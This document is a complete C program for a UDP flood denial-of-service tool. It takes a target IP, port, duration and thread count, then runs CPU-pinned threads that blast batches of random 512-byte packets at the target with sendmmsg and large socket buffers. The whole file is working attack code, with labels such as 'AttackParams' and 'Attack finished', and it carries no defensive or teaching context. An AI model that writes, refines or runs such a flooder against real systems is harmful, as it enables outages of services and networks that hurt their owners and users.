#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/sysinfo.h>

// Optimized parameters
#define MAX_PACKET_SIZE 512
#define SOCKETS_PER_THREAD 2       // Reduced for better resource management
#define BATCH_SIZE 64              // Packets per sendmmsg call
#define BASE_INTERVAL_NS 2000000   // 2ms between batches
#define SOCKET_BUFFER_SIZE (1024 * 1024 * 20) // 20MB buffer
#define MAX_RETRIES 3

typedef struct {
    const char *target_ip;
    uint16_t target_port;
    volatile int *running;
} AttackParams;

static char packet[MAX_PACKET_SIZE];

void optimize_network() {
    int prio = -5;  // Slightly reduced priority
    setpriority(PRIO_PROCESS, 0, prio);
}

void precise_sleep(long ns) {
    struct timespec ts = {0, ns};
    clock_nanosleep(CLOCK_MONOTONIC, 0, &ts, NULL);
}

int create_socket(struct sockaddr_in *dest_addr) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    int buf_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    if (connect(sock, (struct sockaddr*)dest_addr, sizeof(*dest_addr)) == -1) {
        close(sock);
        return -1;
    }
    return sock;
}

void* udp_flood(void *arg) {
    AttackParams *params = (AttackParams*)arg;
    struct sockaddr_in dest_addr;
    int socks[SOCKETS_PER_THREAD];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovs[BATCH_SIZE];

    // Initialize destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest_addr.sin_addr);

    // Initialize batch messages
    for (int i = 0; i < BATCH_SIZE; i++) {
        iovs[i].iov_base = packet;
        iovs[i].iov_len = MAX_PACKET_SIZE;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = NULL;
        msgs[i].msg_hdr.msg_namelen = 0;
    }

    // Create and maintain sockets
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        int retries = MAX_RETRIES;
        while ((socks[i] = create_socket(&dest_addr)) == -1 && retries-- > 0) {
            precise_sleep(1000000); // 1ms delay between retries
        }
    }

    struct timespec next;
    clock_gettime(CLOCK_MONOTONIC, &next);

    while (*params->running) {
        for (int s = 0; s < SOCKETS_PER_THREAD; s++) {
            if (socks[s] == -1) continue;

            int sent = sendmmsg(socks[s], msgs, BATCH_SIZE, 0);
            if (sent < 0) {
                close(socks[s]);
                socks[s] = -1;
                // Attempt to recreate socket once
                socks[s] = create_socket(&dest_addr);
            }
        }

        // Rate limiting with precise timing
        next.tv_nsec += BASE_INTERVAL_NS;
        if (next.tv_nsec >= 1000000000) {
            next.tv_sec++;
            next.tv_nsec -= 1000000000;
        }
        clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if (socks[i] != -1) close(socks[i]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREAD_COUNT>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    uint16_t port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    int num_cpus = get_nprocs();
    if (thread_count > num_cpus) {
        printf("Optimizing: Reducing threads from %d to %d (CPU cores)\n", thread_count, num_cpus);
        thread_count = num_cpus;
    }

    // Initialize payload with pseudo-random pattern
    srand(time(NULL));
    for (int i = 0; i < MAX_PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }

    optimize_network();
    volatile int running = 1;
    pthread_t *threads = calloc(thread_count, sizeof(pthread_t));
    AttackParams *params = calloc(thread_count, sizeof(AttackParams));

    if (!threads || !params) {
        fprintf(stderr, "Memory allocation failed\n");
        return 1;
    }

    // Create worker threads
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = ip;
        params[i].target_port = port;
        params[i].running = &running;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i])) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            continue;
        }

        // Set CPU affinity
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(i % num_cpus, &cpuset);
        pthread_setaffinity_np(threads[i], sizeof(cpu_set_t), &cpuset);
    }

    // Run duration timer
    for (int i = duration * 60; i > 0; i--) {
        printf("Remaining: %d minutes %d seconds\r", i/60, i%60);
        fflush(stdout);
        sleep(1);
    }

    running = 0;
    printf("\nStopping attack...\n");

    // Cleanup
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free(params);
    printf("Attack finished\n");
    return 0;
}